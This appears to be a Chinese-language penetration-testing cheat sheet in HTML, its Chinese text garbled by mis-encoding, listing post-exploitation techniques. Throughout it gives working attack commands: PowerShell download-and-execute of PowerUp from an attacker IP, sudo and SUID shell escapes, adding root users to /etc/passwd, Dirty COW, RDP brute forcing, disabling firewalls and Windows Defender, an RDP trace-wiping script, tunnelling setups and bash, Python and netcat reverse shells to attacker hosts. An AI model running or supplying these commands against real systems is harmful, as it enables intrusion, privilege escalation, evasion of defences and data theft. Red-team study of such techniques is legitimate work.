&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1&#39;);Invoke-AllChecks&quot;
</code></pre>
<p><img src="./img/153.png" alt="image"></p>
<pre><code>&gt;icacls C:\Windows\system32\\wlbsctrl.dll æŸ¥çœ‹æ–‡ä»¶æƒé™ï¼ŒFä¸ºå®Œå…¨æ§åˆ¶ï¼ŒMä¿®æ”¹
</code></pre>
<p><img src="./img/154.png" alt="image"></p>
<pre><code>åœ¨AbuseFunctionä¸­ä¼šæ˜¾ç¤ºåˆ©ç”¨è¯­å¥ã€‚
&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1&#39;); Write-HijackDll -OutputFile &#39;C:\Windows\system32\\wlbsctrl.dll&#39; -Command &#39;net user admin pass@Qwe1 /add&amp;net localgroup administrators admin /add&#39;&quot;
</code></pre>
<p><img src="./img/155.png" alt="image"></p>
<pre><code>é‡å¯ç”µè„‘åä¼šæ–°å¢ç”¨æˆ·admin
</code></pre>
<p><img src="./img/156.png" alt="image"></p>
<pre><code>æŸ¥æ‰¾å¯èƒ½åŠ«æŒçš„è¿›ç¨‹
&gt;Find-ProcessDLLHijack
æŸ¥æ‰¾ç¯å¢ƒå˜é‡ä¸­å½“å‰ç”¨æˆ·å¯ä¿®æ”¹çš„ç›®å½•
&gt;Find-PathDLLHijack
æŸ¥æ‰¾å­˜åœ¨æ³¨å†Œè¡¨ä¸­è‡ªåŠ¨ç™»å½•ç”¨æˆ·çš„å¹³å±€
&gt;Get-RegistryAutoLogon
æŸ¥è¯¢trusted_service_path
&gt;Get-ServiceUnquoted
æŸ¥è¯¢å½“å‰ç”¨æˆ·å¯ä¿®æ”¹çš„æ³¨å†Œè¡¨å¼€æœºå¯åŠ¨é¡¹
&gt;Get-ModifiableRegistryAutoRun
æŸ¥è¯¢å½“å‰ç”¨æˆ·å¯ä¿®æ”¹çš„è®¡åˆ’ä»»åŠ¡é¡¹
&gt;Get-ModifiableScheduledTaskFile
æŸ¥è¯¢ç³»ç»Ÿä¸­æ‰€æœ‰web.configæ–‡ä»¶ä¸­çš„æ˜æ–‡å¯†ç 
&gt;Get-WebConfig
</code></pre>
<h3 id="Powerup-AlwaysInstallElevated"><a href="#Powerup-AlwaysInstallElevated" class="headerlink" title="Powerup-AlwaysInstallElevated"></a>Powerup-AlwaysInstallElevated</h3><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1&#39;);Get-RegAlwaysInstallElevated&quot;
</code></pre>
<p><img src="./img/157.png" alt="image"></p>
<pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1&#39;); Write-UserAddMSI&quot;
æ™®é€šç”¨æˆ·æ‰§è¡Œå®‰è£…
</code></pre>
<p><img src="./img/158.png" alt="image"><br><img src="./img/159.png" alt="image"></p>
<h3 id="AlwaysInstallElevatedææƒ"><a href="#AlwaysInstallElevatedææƒ" class="headerlink" title="AlwaysInstallElevatedææƒ"></a>AlwaysInstallElevatedææƒ</h3><pre><code>&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
ä¸º1 æ£€æµ‹æ˜¯å¦æ°¸è¿œä»¥é«˜æƒé™å¯åŠ¨å®‰è£…
#HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
æ–°å»ºDWORD32 DisableMSI=0
#msfvenom -p windows/adduser USER=msi PASS=pass@123 -f msi -o /root/add.msi
#upload /root/add.msi c:\\1.msi
&gt;msiexec /quiet /qn /i c:\1.msi
MSF
#use exploit/windows/local/always_install_elevated
#set session 1
</code></pre>
<h3 id="Trusted-Service-Paths"><a href="#Trusted-Service-Paths" class="headerlink" title="Trusted Service Paths"></a>Trusted Service Paths</h3><pre><code>&gt;wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot; åˆ—å‡ºæ²¡æœ‰ç”¨å¼•    å·åŒ…å«çš„æœåŠ¡
#use exploit/windows/local/trusted_service_path
#set session 1
</code></pre>
<h3 id="Vulnerable-Services"><a href="#Vulnerable-Services" class="headerlink" title="Vulnerable Services"></a>Vulnerable Services</h3><pre><code>#use exploit/windows/local/service_permissions
#set session 1
</code></pre>
<h3 id="Sudoææƒ"><a href="#Sudoææƒ" class="headerlink" title="Sudoææƒ"></a>Sudoææƒ</h3><pre><code>/home/user/.sudo_as_admin_successful
&gt;sudo zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot;
&gt;sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
&gt;sudo strace â€“o /dev/null /bin/bash
&gt;sudo nmap â€“interactive nmap&gt;!sh
&gt;echo &quot;os.execute(&#39;/bin.sh&#39;)&quot;&gt;/tmp/1.nse
&gt;sudo nmap â€“script=/tmp/shell.nse 
&gt;sudo more/less/man /etc/rsyslog.conf
&gt;sudo git help status 
&gt;!/bin/bash
&gt;sudo ftp
&gt;!/bin/bash
&gt;sudo vim -c &#39;!sh&#39;
&gt;sudo find /bin/ -name ls -exec /bin/bash ;
&gt;sudo awk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;
</code></pre>
<h3 id="Linuxè®¡åˆ’ä»»åŠ¡"><a href="#Linuxè®¡åˆ’ä»»åŠ¡" class="headerlink" title="Linuxè®¡åˆ’ä»»åŠ¡"></a>Linuxè®¡åˆ’ä»»åŠ¡</h3><pre><code>&gt;for user in $(getent passwd|cut -f1 -d:); do echo &quot;### Crontabs for $user ####&quot;; crontab -u $user -l; done åˆ—ä¸¾æ‰€æœ‰ç”¨æˆ·çš„crontab
$cat /etc/crontab
$echo &#39;echo &quot;ignite ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers&#39; &gt;test.sh
$echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;
$echo &quot;&quot; &gt; --checkpoint=1
æˆ–ç¼–è¾‘å¯å†™çš„è®¡åˆ’ä»»åŠ¡æ–‡ä»¶
#!/usr/bin/python
import os,subprocess,socket
s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)
s.connect((&quot;192.168.0.107&quot;,&quot;5555&quot;))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])
</code></pre>
<h3 id="Linux-SUIDææƒ"><a href="#Linux-SUIDææƒ" class="headerlink" title="Linux SUIDææƒ"></a>Linux SUIDææƒ</h3><pre><code>æŸ¥æ‰¾æœ‰rootæƒé™çš„SUIDæ–‡ä»¶
$find / -perm -u=s -type f 2&gt;/dev/null
$find / -user root -perm -4000 -print 2&gt;/dev/null
$find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;
</code></pre>
<h4 id="Find"><a href="#Find" class="headerlink" title="Find"></a>Find</h4><pre><code>$touch xxx
$/usr/bin/find xxx â€“exec whoami \;
$/usr/bin/find xxx â€“exec python -c &#39;import     socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.2&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;  \;
&amp;
&gt;find xxx -exec netcat -lvp 12138 -e /bin/sh \; ç„¶åæ”»å‡»æœºä¸»åŠ¨è¿æ¥
</code></pre>
<h4 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h4><pre><code># è¿›å…¥nmapçš„äº¤äº’æ¨¡å¼
&gt;nmap --interactive 
&gt;!sh
</code></pre>
<h4 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h4><pre><code>&gt;vim.tiny /etc/shadow
&amp;
&gt;vim.tiny
# æŒ‰ESC
:set shell=/bin/sh
:shell
</code></pre>
<h4 id="BASH"><a href="#BASH" class="headerlink" title="BASH"></a>BASH</h4><pre><code>&gt;bash â€“p
</code></pre>
<p>####More/Less/Man<br>    &gt;less /etc/passwd<br>    !/bin/sh<br>    &gt;more /etc/passwd<br>    !/bin/bash<br>    &gt;man passwd<br>    !/bin/bash</p>
<h4 id="CP-MV"><a href="#CP-MV" class="headerlink" title="CP/MV"></a>CP/MV</h4><pre><code>è¦†ç›–shadowæ–‡ä»¶
</code></pre>
<h3 id="Linux-etc-passwdææƒ"><a href="#Linux-etc-passwdææƒ" class="headerlink" title="Linux /etc/passwdææƒ"></a>Linux /etc/passwdææƒ</h3><pre><code>$ls â€“lh /etc/passwd è‹¥æ˜¯ä»»ä½•ç”¨æˆ·å¯è¯»å†™
$perl -le &#39;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#39; ç”Ÿæˆå¯†ç 
$echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd
ä¸€æ¡å‘½ä»¤æ·»åŠ rootç”¨æˆ·
#useradd -p `openssl passwd -1 -salt &#39;user&#39; 123qwe` -u 0 -o -g root  -G root -s /bin/bash -d /home/user venus
ç”¨æˆ·åvenus å¯†ç 123qwe
#useradd newuser;echo &quot;newuser:password&quot;|chpasswd
&gt;echo &quot;admin:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd
&gt;passwd adminä¿®æ”¹å¯†ç 
</code></pre>
<h3 id="Linuxè„ç‰›ææƒ"><a href="#Linuxè„ç‰›ææƒ" class="headerlink" title="Linuxè„ç‰›ææƒ"></a>Linuxè„ç‰›ææƒ</h3><pre><code>https://github.com/FireFart/dirtycow
$gcc -pthread dirty.c -o dirty â€“lcrypt
$./dirty passwd 
ç”Ÿæˆè´¦æˆ·å¯†ç 
https://github.com/gbonacini/CVE-2016-5195
$make
$./dcow -s
</code></pre>
<h2 id="RDP-amp-Fireawall"><a href="#RDP-amp-Fireawall" class="headerlink" title="RDP&amp;Fireawall"></a>RDP&amp;Fireawall</h2><h3 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h3><pre><code>Hydraçˆ†ç ´RDP
&gt;hydra -l admin -P /root/Desktop/passwords -S 192.168.0.0 rdp
&amp;
Nlbrute
</code></pre>
<p><img src="./img/160.png" alt="image"></p>
<h3 id="æ³¨å†Œè¡¨å¼€å¯"><a href="#æ³¨å†Œè¡¨å¼€å¯" class="headerlink" title="æ³¨å†Œè¡¨å¼€å¯"></a>æ³¨å†Œè¡¨å¼€å¯</h3><pre><code>æŸ¥è¯¢ç³»ç»Ÿæ˜¯å¦å…è®¸3389è¿œç¨‹è¿æ¥ï¼š
&gt;REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections
1è¡¨ç¤ºå…³é—­ï¼Œ0è¡¨ç¤ºå¼€å¯
æŸ¥çœ‹è¿œç¨‹è¿æ¥çš„ç«¯å£ï¼š
&gt;REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber
æœ¬æœºå¼€å¯3389è¿œç¨‹è¿æ¥çš„æ–¹æ³•
é€šè¿‡cmd
&gt;REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
&gt;REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f
é€šè¿‡regæ–‡ä»¶
å†…å®¹å¦‚ä¸‹ï¼š
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
&quot;fDenyTSConnections&quot;=dword:00000000
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]
&quot;PortNumber&quot;=dword:00000d3d
å¯¼å…¥æ³¨å†Œè¡¨ï¼š
regedit /s a.reg
</code></pre>
<h3 id="NETSHå¯åŠ¨æœåŠ¡"><a href="#NETSHå¯åŠ¨æœåŠ¡" class="headerlink" title="NETSHå¯åŠ¨æœåŠ¡"></a>NETSHå¯åŠ¨æœåŠ¡</h3><pre><code>&gt;netsh firewall set service remoteadmin enable 
&gt;netsh firewall set service remotedesktop enable
&gt;netsh firewall set opmode disable å…³é—­é˜²ç«å¢™
</code></pre>
<h3 id="æ³¨å…¥ç‚¹å¼€å¯"><a href="#æ³¨å…¥ç‚¹å¼€å¯" class="headerlink" title="æ³¨å…¥ç‚¹å¼€å¯"></a>æ³¨å…¥ç‚¹å¼€å¯</h3><pre><code>.asp?id=100;exec master.dbo.xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\Terminal Server&#39;,&#39;fDenyTSConnections&#39;,&#39;REG_DWORD&#39;,0;--
æ³¨ï¼š
ä¿®æ”¹è¿æ¥ç«¯å£é‡å¯åç”Ÿæ•ˆ
</code></pre>
<h3 id="MSFå¼€å¯"><a href="#MSFå¼€å¯" class="headerlink" title="MSFå¼€å¯"></a>MSFå¼€å¯</h3><pre><code>#run post/windows/manage/enable_rdp
</code></pre>
<h3 id="Wmicå¼€å¯"><a href="#Wmicå¼€å¯" class="headerlink" title="Wmicå¼€å¯"></a>Wmicå¼€å¯</h3><pre><code>&gt;wmic /node:192.168.1.2 /USER:administrator PATH win32_terminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 1
</code></pre>
<h3 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h3><pre><code>å…è®¸è¿›ç«™
å¦‚æœç³»ç»Ÿæœªé…ç½®è¿‡è¿œç¨‹æ¡Œé¢æœåŠ¡ï¼Œç¬¬ä¸€æ¬¡å¼€å¯æ—¶è¿˜éœ€è¦æ·»åŠ é˜²ç«å¢™è§„åˆ™ï¼Œå…è®¸3389ç«¯å£ï¼Œå‘½ä»¤å¦‚ä¸‹:
&gt;netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow
&gt;netsh firewall set portopening TCP 3389 ENABLE
é˜²ç«å¢™å…³é—­
&gt;netsh firewall set opmode mode=disable
&gt;netsh advfirewall show allprofilesæŸ¥çœ‹çŠ¶æ€
&gt;netsh advfirewall set allprofiles state off 
&gt;sc stop windefend
&gt;sc delete windefend
PS&gt; Set-MpPreference -DisableRealtimeMonitoring 1
PS&gt; Set-MpPreference -Disablearchivescanning $true
</code></pre>
<h3 id="å¤šç”¨æˆ·ç™»å½•"><a href="#å¤šç”¨æˆ·ç™»å½•" class="headerlink" title="å¤šç”¨æˆ·ç™»å½•"></a>å¤šç”¨æˆ·ç™»å½•</h3><pre><code>Mimikatzè®¾ç½®å…è®¸å¤šç”¨æˆ·ç™»å½•
&gt;privilege::debug
&gt;ts::multirdp
rdpwrap
https://github.com/stascorp/rdpwrap
&gt;RDPWInst.exe -i is
</code></pre>
<h3 id="RDPè¿æ¥è®°å½•"><a href="#RDPè¿æ¥è®°å½•" class="headerlink" title="RDPè¿æ¥è®°å½•"></a>RDPè¿æ¥è®°å½•</h3><pre><code>https://github.com/3gstudent/List-RDP-Connections-History
æŸ¥çœ‹æœ¬æœºç”¨æˆ·è¿æ¥RDPçš„è®°å½•
</code></pre>
<p><img src="./img/161.png" alt="image"></p>
<pre><code>&gt;Psloggedon.exe username
</code></pre>
<p><img src="./img/162.png" alt="image"></p>
<h3 id="åˆ é™¤ç—•è¿¹"><a href="#åˆ é™¤ç—•è¿¹" class="headerlink" title="åˆ é™¤ç—•è¿¹"></a>åˆ é™¤ç—•è¿¹</h3><pre><code>@echo off
@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f
@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; /a
@exit
</code></pre>
<h2 id="ç«¯å£æ˜ å°„-amp-è½¬å‘"><a href="#ç«¯å£æ˜ å°„-amp-è½¬å‘" class="headerlink" title="ç«¯å£æ˜ å°„&amp;è½¬å‘"></a>ç«¯å£æ˜ å°„&amp;è½¬å‘</h2><h3 id="MSF-3"><a href="#MSF-3" class="headerlink" title="MSF"></a>MSF</h3><pre><code>ä½¿ç”¨æ¡ä»¶ï¼šæœåŠ¡å™¨é€šå¤–ç½‘ï¼Œæ‹¥æœ‰è‡ªå·±çš„å…¬ç½‘ip
&gt;portfwd add -l 5555 -p 3389 -r 172.16.86.153
è½¬å‘ç›®æ ‡ä¸»æœºçš„3389è¿œç¨‹æ¡Œé¢æœåŠ¡ç«¯å£åˆ°æœ¬åœ°çš„5555
&gt;portfwd list
</code></pre>
<h3 id="lcx-exe"><a href="#lcx-exe" class="headerlink" title="lcx.exe"></a>lcx.exe</h3><pre><code>ä½¿ç”¨æ¡ä»¶ï¼šæœåŠ¡å™¨é€šå¤–ç½‘ï¼Œæ‹¥æœ‰è‡ªå·±çš„å…¬ç½‘ip
é¶æœºï¼šlcx.exe -slave å¤–ç½‘IP 9999 127.0.0.1 3389
linuxæ”»å‡»æœºï¼š./portmap -m 2 -p1 9999 -p2 33889
windowsæ”»å‡»æœºï¼šlcx -listen 9999 33889 æŠŠæœ¬æœº9999ç›‘å¬çš„ä¿¡æ¯è½¬åˆ°33889
PortTran
https://github.com/k8gege/K8tools/raw/master/PortTran.rar
æ”»å‡»æœºæ‰§è¡Œ
&gt;PortTranS20.exe 12345 389
</code></pre>
<p><img src="./img/163.png" alt="image"></p>
<pre><code>é¶æœºæ‰§è¡Œ
&gt;PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345
å»ºç«‹è¿æ¥åï¼Œæ”»å‡»æœºè¿æ¥æœ¬æœº389ç«¯å£å³å¯
</code></pre>
<p><img src="./img/164.png" alt="image"></p>
<h3 id="SSH-1"><a href="#SSH-1" class="headerlink" title="SSH"></a>SSH</h3><pre><code>-C å‹ç¼©ä¼ è¾“ï¼ŒåŠ å¿«ä¼ è¾“é€Ÿåº¦
-f åœ¨åå°å¯¹ç”¨æˆ·åå¯†ç è¿›è¡Œè®¤è¯
-N ä»…ä»…åªç”¨æ¥è½¬å‘ï¼Œä¸ç”¨å†å¼¹å›ä¸€ä¸ªæ–°çš„shell -n åå°è¿è¡Œ
-q å®‰é™æ¨¡å¼ï¼Œä¸è¦æ˜¾ç¤ºä»»ä½•debugä¿¡æ¯
-l æŒ‡å®šsshç™»å½•å
-g å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥åˆ°æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£
-L è¿›è¡Œæœ¬åœ°ç«¯å£è½¬å‘
-R è¿›è¡Œè¿œç¨‹ç«¯å£è½¬å‘
-D åŠ¨æ€è½¬å‘ï¼Œå³socksä»£ç†
-T ç¦æ­¢åˆ†é…ä¼ªç»ˆç«¯
-p æŒ‡å®šè¿œç¨‹sshæœåŠ¡ç«¯å£
</code></pre>
<h4 id="æ­£å‘è½¬å‘"><a href="#æ­£å‘è½¬å‘" class="headerlink" title="æ­£å‘è½¬å‘"></a>æ­£å‘è½¬å‘</h4><pre><code>å¤–ç½‘é¶æœº110
å†…ç½‘é¶æœº115
æœ¬åœ°æ”»å‡»æœºç¼–è¾‘årestart sshæœåŠ¡
#vim /etc/ssh/sshd_conf
AllowTcpForwarding yes å…è®¸TCPè½¬å‘
GatewayPorts yes   å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°è½¬å‘çš„ç«¯å£
TCPKeepAlive yes    TCPä¼šè¯ä¿æŒå­˜æ´»
PasswordAuthentication yes  å¯†ç è®¤è¯
&gt;ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22
æœ¬åœ°æ”»å‡»æœºæ‰§è¡Œï¼Œæœ¬åœ°33890è½¬å‘åˆ°è¿œç¨‹çš„3389ç«¯å£
ä¸Šçº¿MSF
æ”»å‡»æœºïƒŸå‡ºç½‘Linuxé¶æœº--ä¸å‡ºç½‘Linuxé¶æœº--ä¸å‡ºç½‘winæœº
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ä¸å‡ºç½‘Linuxæœº lport=12138 -f exe -o /var/www/html/1.exe
æ”»å‡»æœºç›‘å¬ç«¯å£12345
ä¸å‡ºç½‘Linuxæœº
&gt;ssh -C -f -N -g -L 0.0.0.0:12138:æ”»å‡»æœº:12345 root@å‡ºç½‘Linuxä¸»æœº -p 22
</code></pre>
<h4 id="åå‘è½¬å‘"><a href="#åå‘è½¬å‘" class="headerlink" title="åå‘è½¬å‘"></a>åå‘è½¬å‘</h4><pre><code>å¤–ç½‘æ”»å‡»107
å†…ç½‘é¶æœº97
å‡ºç½‘é¶æœºç¼–è¾‘årestart sshæœåŠ¡
#vim /etc/ssh/sshd_conf
AllowTcpForwarding yes å…è®¸TCPè½¬å‘
GatewayPorts yes   å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°è½¬å‘çš„ç«¯å£
TCPKeepAlive yes    TCPä¼šè¯ä¿æŒå­˜æ´»
PasswordAuthentication yes  å¯†ç è®¤è¯
&gt;ssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22
å‡ºç½‘é¶æœºæ‰§è¡Œï¼ŒæŠŠå¤–éƒ¨æ”»å‡»æœº33890è½¬å‘åˆ°å†…éƒ¨éš”ç¦»ç½‘ç»œçš„3389
&gt;netstat â€“tnlp
</code></pre>
<p><img src="./img/165.png" alt="image"></p>
<pre><code>è½¬å‘æˆåŠŸï¼Œå¤–ç½‘æ”»å‡»æœºå®‰è£…apt install rinetd(æ­£å‘tcpè½¬å‘å·¥å…·)
&gt;vim /etc/rinetd.conf
æ·»åŠ 0.0.0.0 3389 127.0.0.1 33890
&gt;service rinetd start
</code></pre>
<p><img src="./img/166.png" alt="image"></p>
<pre><code>çœ‹åˆ°107æ˜¯kaliæ”»å‡»æœºï¼Œè¿æ¥107:33890å³å¯åˆ°è¾¾å†…ç½‘10.1.1.97çš„æ¡Œé¢
</code></pre>
<p><img src="./img/167.png" alt="image"></p>
<h3 id="Invoke-SocksProxy"><a href="#Invoke-SocksProxy" class="headerlink" title="Invoke-SocksProxy"></a>Invoke-SocksProxy</h3><pre><code>https://gitee.com/RichChigga/Invoke-SocksProxy
&gt;Import-Module .\Invoke-SocksProxy.psm1 
&gt;Invoke-SocksProxy -bindPort 12138 å»ºç«‹socksä»£ç†ï¼Œä½¿ç”¨ä»£ç†è½¯ä»¶è¿æ¥
</code></pre>
<p><img src="./img/168.png" alt="image"><br><img src="./img/169.png" alt="image"></p>
<h3 id="SSF"><a href="#SSF" class="headerlink" title="SSF"></a>SSF</h3><h4 id="å•å±‚ç½‘ç»œæ­£å‘è½¬å‘"><a href="#å•å±‚ç½‘ç»œæ­£å‘è½¬å‘" class="headerlink" title="å•å±‚ç½‘ç»œæ­£å‘è½¬å‘"></a>å•å±‚ç½‘ç»œæ­£å‘è½¬å‘</h4><pre><code>https://github.com/securesocketfunneling/ssf/releases
å†…ç½‘æœºæ‰§è¡Œï¼š
&gt;ssfd.exe -p 1080
</code></pre>
<p><img src="./img/170.png" alt="image"></p>
<pre><code>è¾¹ç•Œæœºå™¨æ‰§è¡Œ
&gt;ssf.exe -L 12138:10.1.1.108:22 -p 1080 192.168.0.98 
æŠŠå†…ç½‘10.1.1.108çš„SSHè½¬å‘å‡ºæ¥
</code></pre>
<p><img src="./img/171.png" alt="image"></p>
<pre><code>è¾¹ç•Œæœºå™¨è®¿é—®å†…ç½‘ç«¯å£
</code></pre>
<p><img src="./img/172.png" alt="image">    </p>
<h4 id="å•å±‚ç½‘ç»œåå‘è½¬å‘"><a href="#å•å±‚ç½‘ç»œåå‘è½¬å‘" class="headerlink" title="å•å±‚ç½‘ç»œåå‘è½¬å‘"></a>å•å±‚ç½‘ç»œåå‘è½¬å‘</h4><pre><code>è¾¹ç•Œæœºå™¨æ‰§è¡Œï¼š
&gt;ssfd.exe -p 1080
</code></pre>
<p><img src="./img/173.png" alt="image">    </p>
<pre><code>å†…ç½‘æœºå™¨æ‰§è¡Œï¼š
&gt;ssf.exe -R 12138:10.1.1.108:22 -p 1080 192.168.0.106
</code></pre>
<p><img src="./img/174.png" alt="image"><br><img src="./img/175.png" alt="image"></p>
<h3 id="Netsh"><a href="#Netsh" class="headerlink" title="Netsh"></a>Netsh</h3><pre><code>è¾¹ç•Œæœºå™¨æ‰§è¡Œï¼š
&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=2222 connectaddress=10.1.1.108 connectport=22
å°†å†…ç½‘10.1.1.108ä¸»æœº22ç«¯å£è½¬å‘è‡³æœ¬æœº2222ç«¯å£ï¼Œæ”»å‡»æœºè¿æ¥è¾¹ç•Œæœºå™¨2222ç«¯å£å³å¯è®¿é—®å†…ç½‘SSH
</code></pre>
<p><img src="./img/176.png" alt="image"></p>
<pre><code>&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=13389 connectaddress=192.168.0.98 connectport=3389
å½“é¶æœºæŸæœåŠ¡åªå…è®¸å†…ç½‘è®¿é—®æ—¶ï¼Œå°†ç«¯å£è½¬å‘å‡ºæ¥
</code></pre>
<p><img src="./img/177.png" alt="image"></p>
<pre><code>æ·»åŠ é˜²ç«å¢™è§„åˆ™ï¼š
&gt;netsh advfirewall firewall add rule name=&quot;RDP&quot; protocol=TCP dir=in localip=192.168.0.98 localport=13389 action=allow
åˆ—å‡ºæ‰€æœ‰è½¬å‘è§„åˆ™:
&gt;netsh interface portproxy show all
</code></pre>
<p><img src="./img/178.png" alt="image"></p>
<pre><code>åˆ é™¤æŒ‡å®šçš„ç«¯å£è½¬å‘è§„åˆ™ï¼š
&gt;netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=192.168.0.98
åˆ é™¤æ‰€æœ‰è½¬å‘è§„åˆ™ï¼š
&gt;netsh interface portproxy reset
</code></pre>
<h3 id="Iptables"><a href="#Iptables" class="headerlink" title="Iptables"></a>Iptables</h3><pre><code>éœ€å¼€å¯ipè½¬å‘åŠŸèƒ½
&gt;vim /etc/sysctl.confè®¾ç½®net.ipv4.ip_forward=1
</code></pre>
<p><img src="./img/179.png" alt="image"><br><img src="./img/180.png" alt="image"></p>
<pre><code>æœ¬åœ°ç«¯å£22è½¬å‘åˆ°2222ä¸Š
&gt;iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-ports 22
å†…ç½‘98æœºå™¨3389è½¬åˆ°æœ¬æœº110çš„6789ä¸Š
&gt;iptables -t nat -A PREROUTING -d 192.168.0.110 -p tcp --dport 6789 -j DNAT --to-destination 192.168.0.98:3389
&gt;iptables -t nat -A POSTROUTING -d 192.168.0.98 -p tcp --dport 3389 -j SNAT --to 192.168.0.110
</code></pre>
<p><img src="./img/181.png" alt="image"></p>
<pre><code>æŸ¥çœ‹è§„åˆ™
&gt;iptables -t nat -L
åˆ é™¤è§„åˆ™
&gt;iptables -t nat -D PREROUTING 1
åˆ é™¤å…¨éƒ¨è§„åˆ™
&gt;iptables -t nat â€“F
</code></pre>
<h3 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h3><pre><code>https://github.com/jpillora/chisel
æ”»å‡»æœºæ‰§è¡Œ
&gt;chisel server -p 12138 â€“reverse
</code></pre>
<p><img src="./img/182.png" alt="image"></p>
<pre><code>é¶æœºæ‰§è¡Œ
&gt;chisel client å…¬ç½‘æ”»å‡»æœºIP:12138 R:1234:127.0.0.1:3389
</code></pre>
<p><img src="./img/183.png" alt="image"></p>
<pre><code>å»ºç«‹æˆåŠŸåï¼Œæ”»å‡»æœºè¿æ¥æœ¬æœº1234ç«¯å£å³å¯è®¿é—®é¶æœº3389
</code></pre>
<p><img src="./img/184.png" alt="image"></p>
<h2 id="å‘½ä»¤-amp-æ§åˆ¶"><a href="#å‘½ä»¤-amp-æ§åˆ¶" class="headerlink" title="å‘½ä»¤&amp;æ§åˆ¶"></a>å‘½ä»¤&amp;æ§åˆ¶</h2><h3 id="Interactive-shell"><a href="#Interactive-shell" class="headerlink" title="Interactive shell"></a>Interactive shell</h3><pre><code>&gt;python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
&gt;expect -c &#39;spawn bash;interact&#39;
</code></pre>
<h3 id="Script-reverse-shell"><a href="#Script-reverse-shell" class="headerlink" title="Script reverse shell"></a>Script reverse shell</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><pre><code>&gt;/bin/bash -i &gt; /dev/tcp/attackerip/4444 0&lt;&amp;1 2&gt;&amp;1
</code></pre>
<p><img src="./img/185.png" alt="image"></p>
<pre><code>&gt;bash -i &gt;&amp; /dev/tcp/attackerip/4444 0&gt;&amp;1
</code></pre>
<p><img src="./img/186.png" alt="image"></p>
<pre><code>&gt;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
